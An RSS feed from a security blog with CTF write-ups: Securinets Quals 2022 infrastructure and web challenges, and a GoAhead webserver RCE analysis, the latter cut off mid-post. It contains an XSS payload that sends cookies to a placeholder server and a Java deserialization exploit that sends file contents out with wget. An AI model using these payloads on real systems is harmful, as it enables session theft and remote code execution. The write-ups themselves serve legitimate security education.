<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts | Ahmed Belkahla</title>
    <link>https://ahmed-belkahla.me/post/</link>
      <atom:link href="https://ahmed-belkahla.me/post/index.xml" rel="self" type="application/rss+xml" />
    <description>Posts</description>
    <generator>Source Themes Academic (https://sourcethemes.com/academic/)</generator><language>en-us</language><copyright>Â© Ahmed Belkahla, 2022</copyright><lastBuildDate>Thu, 14 Apr 2022 00:00:00 +0000</lastBuildDate>
    <image>
      <url>https://ahmed-belkahla.me/img/me.jpg</url>
      <title>Posts</title>
      <link>https://ahmed-belkahla.me/post/</link>
    </image>
    
    <item>
      <title>Securinets CTF Quals 2022 - Infrastructure and Web writeups</title>
      <link>https://ahmed-belkahla.me/post/securinetsquals/</link>
      <pubDate>Thu, 14 Apr 2022 00:00:00 +0000</pubDate>
      <guid>https://ahmed-belkahla.me/post/securinetsquals/</guid>
      <description>&lt;p&gt;The last weekend we organised Securinets CTF Quals 2022, which is the most prestigious CTF in Tunisia and one of the most internationally known CTFs, this year we will reach around 70 weight after the positive feedbacks which is a huge achievement.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/NYhqlD8.png&#34; alt=&#34;CTFTIME&#34;&gt;&lt;/p&gt;
&lt;p&gt;As Securinets Technical director I was in charge of managing the CTF, I took care of the Infrastructure and wrote 3 web challenges. In this article we will talk about some infrastructure details and the solutions of my web challenges.
1-Infrastructure
2-Planet sheet Writeup (XSS with CSP Bypass)
3-BrokenParrot Writeup (Custom Java Deserialization Gadget)
4-NarutoKeeper Writeup (XSLeak Challenge)&lt;/p&gt;
&lt;h2 id=&#34;infrastructure&#34;&gt;Infrastructure&lt;/h2&gt;
&lt;p&gt;We knew that a huge number will participate so we tried to anticipate in order to have a stable infrastructure. We opted for the following architecture:&lt;/p&gt;
&lt;p&gt;A separated instance for the Database and an instance for the platform. I used docker swarm ( 4 containers ) and Traefik as a load balancer to ensure a certain level of scalability. This was the final docker-compose:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-yaml&#34;&gt;version: &#39;3.8&#39;

services:
  ctfd:
    image: 127.0.0.1:2000/qualsplat
    build: .
    user: root
    restart: always
    ports:
      - &amp;quot;8000:8000&amp;quot;
    environment:
      - DATABASE_URL=mysql+pymysql://ctfd:REDACTED@IP/ctfd
      - SECRET_KEY=REDACTED
      - REDIS_URL=redis://cache:6379
      - WORKERS=6
      - LOG_FOLDER=/var/log/CTFd
      - SQLALCHEMY_MAX_OVERFLOW=800
      - SQLALCHEMY_POOL_PRE_PING=True
      - ACCESS_LOG=-
      - ERROR_LOG=-
      - REVERSE_PROXY=true
 #   volumes:
 #     - /logs:/var/log/CTFd
 #     - /opt/CTFd:/opt/CTFd:ro
    deploy:
      replicas: 4
      placement:
        max_replicas_per_node: 4
      labels:
        - &amp;quot;traefik.enable=true&amp;quot;
        - &amp;quot;traefik.http.routers.ctfd.rule=Host(`20.231.33.243`) || Host(`www.ctfsecurinets.tech`) || Host(`ctfsecurinets.tech`)&amp;quot;
        - &amp;quot;traefik.http.routers.ctfd.entrypoints=web&amp;quot;
        - &amp;quot;traefik.http.services.ctfd.loadbalancer.server.port=8000&amp;quot;
        - &amp;quot;traefik.http.services.ctfd.loadbalancer.sticky=true&amp;quot;
        - &amp;quot;traefik.http.services.ctfd.loadbalancer.sticky.cookie.name=StickyCookie&amp;quot;
    networks:
        net:
        internal:


  loadbalancer:
    image: traefik:v2.2
    command: 
      - &amp;quot;--log.level=ERROR&amp;quot;
      - &amp;quot;--api.insecure=true&amp;quot;
      - &amp;quot;--providers.docker.swarmMode=true&amp;quot;
      - &amp;quot;--providers.docker.network=quals_net&amp;quot;
      - &amp;quot;--providers.docker.exposedbydefault=false&amp;quot;
      - &amp;quot;--entrypoints.web.address=:80&amp;quot;
    ports:
      - 80:80
      - 9000:8080
      - 5000:5000
    network_mode: &amp;quot;host&amp;quot;
    deploy:
      restart_policy:
        condition: any
      mode: replicated
      placement:
        constraints:
          - &amp;quot;node.role==manager&amp;quot;
         max_replicas_per_node: 1
      replicas: 1
      update_config:
        delay: 2s
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
    networks:
        net:

networks:
    default:
    internal:
        internal: true
    net:

&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;monitoring&#34;&gt;Monitoring&lt;/h3&gt;
&lt;p&gt;For monitoring and alerting I inspired from @theoremoon san in Zer0ptsCTF and used 
&lt;a href=&#34;https://mackerel.io&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Mackerel&lt;/a&gt; .&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/BHHTuwV.png&#34; alt=&#34;DASHBOARD&#34;&gt;&lt;/p&gt;
&lt;p&gt;It is easy to setup and supports alerting via different channels ( including Discord ) so I installed the agent in the most critical servers of the infra which helped us a lot in handling and anticipating the different issues.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/82gqHiE.png&#34; alt=&#34;MONITOR&#34;&gt;&lt;/p&gt;
&lt;p&gt;In case of any alerts we receive a similar message in discord:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/hiKJuMO.png&#34; alt=&#34;ALERT&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;web-challenges-writeup&#34;&gt;Web Challenges Writeup:&lt;/h1&gt;
&lt;h2 id=&#34;planet-sheet&#34;&gt;Planet sheet:&lt;/h2&gt;
&lt;p&gt;I thought that this challenge will be a good warm up but some players ended up having some troubles with it. Visiting the website we can notice /show.php page that has a src parameter getting reflected directly in the page:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/7zGxIBp.png&#34; alt=&#34;REFLECTED&#34;&gt;&lt;/p&gt;
&lt;p&gt;We can notice that the Content-Type is &lt;strong&gt;text/xsl&lt;/strong&gt; so usual script tags won&amp;rsquo;t work here since it&amp;rsquo;s not rendered as an HTML Page.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/ikGS9Pk.png&#34; alt=&#34;CT&#34;&gt;
So we will use the following payload to execute JS code.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;x:script xmlns:x=&amp;quot;http://www.w3.org/1999/xhtml&amp;quot;&amp;gt;alert(document.domain)&amp;lt;/x:script&amp;gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;A keen eye may have already noticed the CSP. For the first time it may appear as a strict policy protected by nonces but if we refresh the page for a few times, we can see that the nonce is fixed thus we can reuse it here.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;x:script nonce=&amp;quot;Y8Ret8N5CPXrSG&amp;quot; xmlns:x=&amp;quot;http://www.w3.org/1999/xhtml&amp;quot;&amp;gt;fetch(&amp;quot;http://Your_Server?a=&amp;quot;+document.cookie)&amp;lt;/x:script&amp;gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;brokenparr0t&#34;&gt;BrokenParr0t&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/UFecnMQ.png&#34; alt=&#34;CARD&#34;&gt;&lt;/p&gt;
&lt;p&gt;I was lately interested in Java Deserialization custom gadget chains and done a lot of researchs on this subject, my first attempt was in FwordCTF 2021 where I created Parrot challenge (
&lt;a href=&#34;https://exti0p.github.io/ctf/2021/FwordCTF/web/parrotox.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Writeup&lt;/a&gt; If you are interested) and in Securinets Quals I decided to try another idea with some new gadget types.
As always, we have given the source code to the participants. After decompiling the jar file with jd-gui, we can explore the different classes of the application. At first glance, we can notice the arbitrary java deserialization in the /latest_question endpoint but we can notice that the input is handled first by a class Security.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/HlkSnEl.png&#34; alt=&#34;SOURCE&#34;&gt;&lt;/p&gt;
&lt;p&gt;Digging in Security class we see that it&amp;rsquo;s restricting the deserialization of only the classes in com.securinets.utils  and java.(.*) packages.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/Rab6YyP.png&#34; alt=&#34;SECURITY&#34;&gt;&lt;/p&gt;
&lt;p&gt;It&amp;rsquo;s pretty obvious that we manually need to craft the gadget chain to achieve RCE since automated tools won&amp;rsquo;t work here. We can see that com.securinets.utils.QuestionCompar is overriding compare method and deserializing the value of &lt;strong&gt;internal&lt;/strong&gt; attribute after Base64 decoding it. The deserialized object here is also restricted by another class called LooseSecurity which let us deserialize classes from com.securinets package, so the scope to search for gadgets is bigger.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/Zzk0BHQ.png&#34; alt=&#34;JAVA&#34;&gt;&lt;/p&gt;
&lt;p&gt;The idea here is to PriorityQueue class in java.util with the custom comparator QuestionCompar as an entry gadget. If we dig in PriorityQueue source code in jdk, we see that when it&amp;rsquo;s deserialized it calls the method heapify 
&lt;a href=&#34;http://hg.openjdk.java.net/jdk8/jdk8/jdk/file/687fd7c7986d/src/share/classes/java/util/PriorityQueue.java#l779&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;L779&lt;/a&gt;, heapify method will also call siftdown 
&lt;a href=&#34;http://hg.openjdk.java.net/jdk8/jdk8/jdk/file/687fd7c7986d/src/share/classes/java/util/PriorityQueue.java#l734&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;L734&lt;/a&gt; that will call siftdown 
&lt;a href=&#34;http://hg.openjdk.java.net/jdk8/jdk8/jdk/file/687fd7c7986d/src/share/classes/java/util/PriorityQueue.java#l685&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;L695&lt;/a&gt;. finally since we have provided a custom comparator, siftDownUsingComparator method will call the overriden compare method in QuestionCompa comparator 
&lt;a href=&#34;http://hg.openjdk.java.net/jdk8/jdk8/jdk/file/687fd7c7986d/src/share/classes/java/util/PriorityQueue.java#l712&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;L712&lt;/a&gt;.
Now for the last piece, we can take a look at the serializable class com.securinets.services.Author that is calling compute method as follow:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/Fr9jBpn.png&#34; alt=&#34;AUTHOR&#34;&gt;&lt;/p&gt;
&lt;p&gt;We need to set uuid attribute to a value that has a hashcode equal to 0 (f5a5a608), and name attribute to our final payload that reads the flag.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;import com.securinets.services.Author;
import com.securinets.utils.QuestionCompar;

import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.Comparator;
import java.util.PriorityQueue;

public class Exp {
    public Exp() {
    }

    public static void main(String[] var0) {
        try {
//second object
            Author auth = new Author();
            Field uuid = Author.class.getDeclaredField(&amp;quot;uuid&amp;quot;);
            uuid.setAccessible(true);
            uuid.set(auth, new String(&amp;quot;f5a5a608&amp;quot;));
            Field name = Author.class.getDeclaredField(&amp;quot;name&amp;quot;);
            name.setAccessible(true);
            name.set(auth, new String(&amp;quot;sh -c $@|sh . echo wget http://Your_Server?a=$(cat /flag.txt|base64|tr -d \&amp;quot;\n\&amp;quot;)&amp;quot;));
            final ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            final ObjectOutputStream objectOutputStream;
            objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(auth);
            objectOutputStream.close();
            String secondSerial = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());

            Constructor ctor =  QuestionCompar.class.getDeclaredConstructor();
            ctor.setAccessible(true);
            Comparator comparator=(Comparator) ctor.newInstance();
            Field var1 = QuestionCompar.class.getDeclaredField(&amp;quot;internal&amp;quot;);
            var1.setAccessible(true);
            var1.set(comparator, secondSerial);
            final PriorityQueue&amp;lt;Object&amp;gt; queue = new PriorityQueue&amp;lt;Object&amp;gt;(2, comparator);
            queue.add(new String(&amp;quot;1&amp;quot;));
            queue.add(new String(&amp;quot;1&amp;quot;));


            FileOutputStream fileOutputStream
                    = new FileOutputStream(&amp;quot;result&amp;quot;);
            ObjectOutputStream oos
                    = new ObjectOutputStream(fileOutputStream);
            oos.writeObject(queue);
            oos.flush();
            oos.close();

            System.out.println(&amp;quot;Object has been serialized&amp;quot;);
        } catch (Exception var6) {
            System.out.println(&amp;quot;IOException is caught&amp;quot;);
	    var6.printStackTrace();
        }
    }
}


&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;In a nutshell, this exploit starts by creating a ProprityQueue object implementing QuestionCompar as a custom comparator after setting the internal attribute to the value of Author class serialized and Base64 encoded.&lt;/p&gt;
&lt;h2 id=&#34;narutokeeper&#34;&gt;NarutoKeeper&lt;/h2&gt;
&lt;p&gt;XSLeak vulnerability attracted me a lot lately so as a ritual I&amp;rsquo;m publishing a different challenge about this vulnerability in every CTF. This particular challenge was meant to be harder, but due to a little mistake it was solved with another technique, so I decided to keep the intended solution for a future CTF since it&amp;rsquo;s worth the effort.
&lt;img src=&#34;https://i.imgur.com/is1Wwwa.png&#34; alt=&#34;TASK&#34;&gt;
As every XSLeak challenge we need to leak the flag from a cross origin context. Here in the search endpoint we can notice that is the answer is correct we will be redirected to /view endpoint otherwise we will receive a no results message. So if we detect if the redirect has happened or not in cross origin, we will manage to exfiltrate the flag char by char.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/gx6QDgF.png&#34; alt=&#34;SEARCH&#34;&gt;&lt;/p&gt;
&lt;p&gt;In fact, fetch throws an error if we exceed 20 redirects, so the idea is to redirect the admin to our controlled website 19 times and in the 20th redirect we initiate our search request, thus if the char is correct we will be redirected to /view so we will have a network error since we exceeded the possible 20 redirect otherwise network error won&amp;rsquo;t be triggered.
You can check the following &lt;strong&gt;
&lt;a href=&#34;https://ctf.zeyu2001.com/2022/securinets-ctf-quals-2022/narutokeeper&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Writeup&lt;/a&gt;&lt;/strong&gt; and exploit by zeyu2001 for example.&lt;/p&gt;
&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;We hope that everyone enjoyed this edition of Securinets Quals, we were very happy to reach 70 weight in CTFTime so we are now the most rated CTF in MENA Region. We can&amp;rsquo;t wait to see everyone in the finals so soon!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>PBCTF 2021 - RCE 0-Day in Goahead Webserver</title>
      <link>https://ahmed-belkahla.me/post/2-methods-rce-0-day-in-goahead-webserver-pbctf-2021/</link>
      <pubDate>Tue, 12 Oct 2021 00:00:00 +0000</pubDate>
      <guid>https://ahmed-belkahla.me/post/2-methods-rce-0-day-in-goahead-webserver-pbctf-2021/</guid>
      <description>&lt;h1 id=&#34;2-methods-rce-0-day-in-goahead-webserver-pbctf-2021&#34;&gt;2 methods RCE 0-Day in Goahead Webserver: PBCTF 2021&lt;/h1&gt;
&lt;p&gt;Last weekend I participated with my team Zer0pts in PBCTF 2021 and we got the 5th place, we were really close to secure a spot in the top 3 but an error in Wine while solving a shitty misc challenge prived us from this win :(&lt;/p&gt;
&lt;p&gt;However, the CTF had some challenges tagged as &lt;strong&gt;pb2own&lt;/strong&gt; that needed us to find a 0-day in order to solve them. I have passed almost all the time focusing on advancement web challenge that aimed to find an RCE in &lt;strong&gt;goahead&lt;/strong&gt; webserver.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;GoAhead is the world&amp;rsquo;s most popular, tiny embedded web server. It is compact, secure &lt;code&gt;wondering if it&#39;s really secure haha&lt;/code&gt; and simple to use. GoAhead is deployed in hundreds of millions of devices and is ideal for the smallest of embedded devices&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We managed to achieve RCE in two methods, one that worked on the challenge and another one that was theoretical and not stable but itâs worth mentioning. So without more introduction letâs jump to the analysis of how we did the code review of this huge C code.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Note:&lt;/em&gt; the lesson of the day is that whenever you hit a wall just ping @st98 senpai .&lt;/p&gt;
&lt;h3 id=&#34;initial-thoughts&#34;&gt;Initial Thoughts:&lt;/h3&gt;
&lt;p&gt;@st98 senpai firstly mentioned that we have the latest version of goahead running with some simple cgi binary and basic configuration.
I started by understanding the inner working of goahead server. &lt;strong&gt;
&lt;a href=&#34;[goahead.c]%28https://github.com/embedthis/goahead/blob/master/src/goahead.c%29&#34;&gt;goahead.c&lt;/a&gt;&lt;/strong&gt; file has the main function where it parses the configuration files and the CLI args but it has nothing important in our case. I jumped then to &lt;strong&gt;http.c&lt;/strong&gt; where the main logic of handling the HTTP requests is there. We can see that after parsing the different HTTP headers, it stores all the information in a structure named Webs that is declared in &lt;strong&gt;goahead.h&lt;/strong&gt; as follow:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;typedef struct Webs {
    WebsBuf         rxbuf;              /**&amp;lt; Raw receive buffer */
    WebsBuf         input;              /**&amp;lt; Receive buffer after de-chunking */
    WebsBuf         output;             /**&amp;lt; Transmit buffer after chunking */
    WebsBuf         chunkbuf;           /**&amp;lt; Pre-chunking data buffer */
    WebsBuf         *txbuf;
    WebsTime        since;              /**&amp;lt; Parsed if-modified-since time */
    WebsTime        timestamp;          /**&amp;lt; Last transaction with browser */
    WebsHash        vars;               /**&amp;lt; CGI standard variables */
    int             timeout;            /**&amp;lt; Timeout handle */
    char            ipaddr[ME_MAX_IP];  /**&amp;lt; Connecting ipaddress */
    char            ifaddr[ME_MAX_IP];  /**&amp;lt; Local interface ipaddress */

    int             rxChunkState;       /**&amp;lt; Rx chunk encoding state */
    ssize           rxChunkSize;        /**&amp;lt; Rx chunk size */
.
.
.
.
    WebsHash        responseCookies;    /**&amp;lt; Outgoing cookies */
    struct WebsSession *session;        /**&amp;lt; Session record */
    struct WebsRoute *route;            /**&amp;lt; Request route */
    struct WebsUser *user;              /**&amp;lt; User auth record */
.
.
. 
#if ME_GOAHEAD_UPLOAD
    int             upfd;               /**&amp;lt; Upload file handle */
    WebsHash        files;              /**&amp;lt; Uploaded files */
    char            *boundary;          /**&amp;lt; Mime boundary (static) */
    ssize           boundaryLen;        /**&amp;lt; Boundary length */
    int             uploadState;        /**&amp;lt; Current file upload state */
    WebsUpload      *currentFile;       /**&amp;lt; Current file context */
    char            *clientFilename;    /**&amp;lt; Current file filename */
    char            *uploadTmp;         /**&amp;lt; Current temp filename for upload data */
    char            *uploadVar;         /**&amp;lt; Current upload form variable name */
#endif
    void            *ssl;               /**&amp;lt; SSL context */
} Webs;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Then you can see its initialization here &lt;strong&gt;
&lt;a href=&#34;https://github.com/embedthis/goahead/blob/master/src/http.c#L361&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;L361&lt;/a&gt;&lt;/strong&gt; which seems logic, along with the other functions it only parses the different elements of the HTTP request.
Honestly I didn&amp;rsquo;t pay close attention on parsing issues since I believed ( my intuition let&amp;rsquo;s say xD) that we will have to abuse or chain something related to CGI binaries execution. However it was worth giving a look at &lt;code&gt;websValidateUriPath&lt;/code&gt; function that calls &lt;code&gt;websNormalizeUriPath&lt;/code&gt; &lt;strong&gt;
&lt;a href=&#34;https://github.com/embedthis/goahead/blob/master/src/http.c#L2789&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;L2789&lt;/a&gt;&lt;/strong&gt; and see if it has any url decoding issues that can lead for example to a path traversal but afaik and after some trials I didn&amp;rsquo;t see anything suspicious. No double Url encoding or altering paths techniques worked.&lt;/p&gt;
&lt;h3 id=&#34;path-traversal-on-the-cgi-binary&#34;&gt;Path traversal on the CGI binary:&lt;/h3&gt;
&lt;p&gt;The first idea I got was trying to achieve path traversal somewhere in the cgi handler.I started reviewing &lt;strong&gt;
&lt;a href=&#34;https://github.com/embedthis/goahead/blob/master/src/cgi.c&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;cgi.c&lt;/a&gt;&lt;/strong&gt; file and I noticed that we have full control of the arguments passed to the cgi binary as mentioned in this part of code:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;    *argp = cgiPath;
    n = 1;
    query = 0;

    if (strchr(wp-&amp;gt;query, &#39;=&#39;) == NULL) {
        query = sclone(wp-&amp;gt;query);
        websDecodeUrl(query, query, strlen(query));
        for (cp = stok(query, &amp;quot; &amp;quot;, &amp;amp;tok); cp != NULL &amp;amp;&amp;amp; argp != NULL; ) {
            *(argp+n) = cp;
            trace(5, &amp;quot;ARG[%d] %s&amp;quot;, n, argp[n-1]);
            n++;
            if (n &amp;gt;= argpsize) {
                argpsize *= 2;
                if (argpsize &amp;gt; ME_GOAHEAD_LIMIT_CGI_ARGS) {
                    websError(wp, HTTP_CODE_REQUEST_TOO_LARGE, &amp;quot;Too many arguments&amp;quot;);
                    wfree(cgiPath);
                    return 1;
                }
                argp = wrealloc(argp, argpsize * sizeof(char *));
            }
            cp = stok(NULL, &amp;quot; &amp;quot;, &amp;amp;tok);
        }
    }
    *(argp+n) = NULL;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Besically if there is no &lt;code&gt;=&lt;/code&gt; in our query the webserver will url decode again the query, split it by &amp;quot; &amp;quot; and then pass the result as the args array. So the following url &lt;code&gt;http://advancement.perfect.blue/cgi-binary/date?aa%20dd&lt;/code&gt; will result in &lt;code&gt;aa&lt;/code&gt; and &lt;code&gt;dd&lt;/code&gt; passed as arguments.
So if we can somehow run for example /bin/sh instead of the intended cgi binary we can have an easy win and run the following payload for example &lt;code&gt;bin/sh -c {command}&lt;/code&gt;.
Unfortunately after a lot of trials this method wasn&amp;rsquo;t possible because of the following part of code that was sanitizing the CGI filename:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;    getcwd(cwd, ME_GOAHEAD_LIMIT_FILENAME);
    dir = wp-&amp;gt;route-&amp;gt;dir ? wp-&amp;gt;route-&amp;gt;dir : cwd;
    chdir(dir);

    extraPath = 0;
    if ((cp = strchr(cgiName, &#39;/&#39;)) != NULL) {
        extraPath = sclone(cp);
        *cp = &#39;\0&#39;;
        websSetVar(wp, &amp;quot;PATH_INFO&amp;quot;, extraPath);
        websSetVarFmt(wp, &amp;quot;PATH_TRANSLATED&amp;quot;, &amp;quot;%s%s%s&amp;quot;, dir, cgiPrefix, extraPath);
        wfree(extraPath);
    } else {
        websSetVar(wp, &amp;quot;PATH_INFO&amp;quot;, &amp;quot;&amp;quot;);
        websSetVar(wp, &amp;quot;PATH_TRANSLATED&amp;quot;, &amp;quot;&amp;quot;);
    }
    cgiPath = sfmt(&amp;quot;%s%s/%s&amp;quot;, dir, cgiPrefix, cgiName);
    websSetVarFmt(wp, &amp;quot;SCRIPT_NAME&amp;quot;, &amp;quot;%s/%s&amp;quot;, cgiPrefix, cgiName);
    websSetVar(wp, &amp;quot;SCRIPT_FILENAME&amp;quot;, cgiPath);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The code is simple, it replaces the first &lt;code&gt;/&lt;/code&gt; in cgiName with a null byte so the cgiName cannot hold any path traversal payload like &lt;code&gt;../../&lt;/code&gt; since it will be trimmed. I tried a lot of stuffs and manipulations in order to bypass this restriction like using double url encodings but in vain.
One idea I had faith in, was trying to find some misconsistency in the url decoding logic of the webserver, if we can force another urldecoding operation after passing the check we will have an easy win. After some intense  review of the cgi component and different other components I couldn&amp;rsquo;t achieve it :( I wished that this line was urldecoding the whole path &lt;strong&gt;
&lt;a href=&#34;https://github.com/embedthis/goahead/blob/master/src/cgi.c#L193&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;L193&lt;/a&gt;&lt;/strong&gt; :&#39;(&lt;/p&gt;
&lt;h3 id=&#34;abusing-environment-variables&#34;&gt;Abusing Environment variables:&lt;/h3&gt;
&lt;p&gt;After a lot of trials I gave up on the idea of running another cgi binary and do path traversal and started focusing on how environment variables are handled. This part of code is the most juicy one:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c=&#34;&gt;    envpsize = 64;
    envp = walloc(envpsize * sizeof(char*));
    if (wp-&amp;gt;vars) {
        for (n = 0, s = hashFirst(wp-&amp;gt;vars); s != NULL; s = hashNext(wp-&amp;gt;vars, s)) {
            if (s-&amp;gt;content.valid &amp;amp;&amp;amp; s-&amp;gt;content.type == string) {
                vp = strim(s-&amp;gt;name.value.string, &amp;quot; \t\r\n&amp;quot;, WEBS_TRIM_BOTH);
                for (bp = envBlackList; *bp; bp++) {
                    if (smatch(vp, *bp)) {
                        continue;
                    }
                }
                if (sstarts(vp, &amp;quot;LD_&amp;quot;) || sstarts(vp, &amp;quot;LDR_&amp;quot;) || sstarts(vp, &amp;quot;_RLD&amp;quot;) || sstarts(vp, &amp;quot;DYLD_&amp;quot;) || strstr(vp, &amp;quot;=()&amp;quot;)) {
                    continue;
                }
                if (s-&amp;gt;arg != 0 &amp;amp;&amp;amp; *ME_GOAHEAD_CGI_VAR_PREFIX != &#39;\0&#39;) {
                    envp[n++] = sfmt(&amp;quot;%s%s=%s&amp;quot;, ME_GOAHEAD_CGI_VAR_PREFIX, s-&amp;gt;name.value.string,
                        s-&amp;gt;content.value.string);
                } else {
                    envp[n++] = sfmt(&amp;quot;%s=%s&amp;quot;, s-&amp;gt;name.value.string, s-&amp;gt;content.value.string);
                }
                trace(0, &amp;quot;Env[%d] %s&amp;quot;, n, envp[n-1]);
                if (n &amp;gt;= envpsize) {
                    envpsize *= 2;
                    envp = wrealloc(envp, envpsize * sizeof(char *));
                }
            }
        }
    }
    *(envp+n) = NULL;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The most trained eye noticed the filter that prohibits using the known LD_* env vars and some other sensible ones. Tl;DR we can only set arbitrary environement variables but with &lt;code&gt;CGI_&lt;/code&gt; prefix. You can also notice that it&amp;rsquo;s setting &lt;code&gt;wp-&amp;gt;vars&lt;/code&gt; content as env vars too (wp is Webs structure that is set in &lt;strong&gt;http.c&lt;/strong&gt; as we mentioned in the beginning).&lt;/p&gt;
&lt;p&gt;Looking at &lt;strong&gt;http.c&lt;/strong&gt; file again we can see at &lt;strong&gt;
&lt;a href=&#34;https://github.com/embedthis/goahead/blob/master/src/http.c#L1081&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;L1081 &lt;/a&gt;&lt;/strong&gt; how &lt;code&gt;wp-&amp;gt;vars&lt;/code&gt; is set:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c=&#34;&gt;        upperKey = sfmt(&amp;quot;HTTP_%s&amp;quot;, key);
        for (cp = upperKey; *cp; cp++) {
            if (*cp == &#39;-&#39;) {
                *cp = &#39;_&#39;;
            }
        }
        supper(upperKey);
        if ((prior = websGetVar(wp, upperKey, 0)) != 0) {
            combined = sfmt(&amp;quot;%s, %s&amp;quot;, prior, value);
            websSetVar(wp, upperKey, combined);
            wfree(combined);
        } else {
            websSetVar(wp, upperKey, value);
        }
        wfree(upperKey);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;You can notice that any HTTP header we send is added to &lt;code&gt;wp-&amp;gt;vars&lt;/code&gt; after concatenating the prefix &lt;code&gt;HTTP_&lt;/code&gt; so we can also set arbitrary environment variables with &lt;code&gt;HTTP_&lt;/code&gt; as a prefix but we can&amp;rsquo;t do a lot of stuffs because of these restrictions.&lt;/p&gt;
&lt;p&gt;At this part I didn&amp;rsquo;t know what to do next so I started digging in the code and in other components hoping that I can find something useful until @st98 senpai sent the following in the discord channel of the team:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/tn0QELk.png&#34; alt=&#34;DISCORD&#34;&gt;&lt;/p&gt;
&lt;p&gt;Honestly we didn&amp;rsquo;t know at first why this happened, but let&amp;rsquo;s take a look at &lt;strong&gt;http.c&lt;/strong&gt; file at &lt;strong&gt;
&lt;a href=&#34;https://github.com/embedthis/goahead/blob/master/src/http.c#L1404&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;L1404&lt;/a&gt;&lt;/strong&gt; . You can see from the code that it&amp;rsquo;s adding form data to &lt;code&gt;wp-&amp;gt;vars&lt;/code&gt; without any prior sanitization and as we mentioned &lt;code&gt;wp-&amp;gt;vars&lt;/code&gt; was added to the environment variables:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c=&#34;&gt;static void addFormVars(Webs *wp, char *vars)
{
    WebsKey     *sp;
    cchar       *prior;
    char        *keyword, *value, *tok;

    assert(wp);
    assert(vars);

    keyword = stok(vars, &amp;quot;&amp;amp;&amp;quot;, &amp;amp;tok);
    while (keyword != NULL) {
        if ((value = strchr(keyword, &#39;=&#39;)) != NULL) {
            *value++ = &#39;\0&#39;;
            websDecodeUrl(keyword, keyword, strlen(keyword));
            websDecodeUrl(value, value, strlen(value));
        } else {
            value = &amp;quot;&amp;quot;;
        }
        if (*keyword) {
            /*
                If keyword has already been set, append the new value to what has been stored.
             */
            if ((prior = websGetVar(wp, keyword, NULL)) != 0) {
                sp = websSetVarFmt(wp, keyword, &amp;quot;%s %s&amp;quot;, prior, value);
            } else {
                sp = websSetVar(wp, keyword, value);
            }
            /* Flag as untrusted keyword by setting arg to 1. This is used by CGI to prefix this keyword */
            sp-&amp;gt;arg = 1;
        }
        keyword = stok(NULL, &amp;quot;&amp;amp;&amp;quot;, &amp;amp;tok);
    }
}
&lt;/code&gt;&lt;/pre&gt;
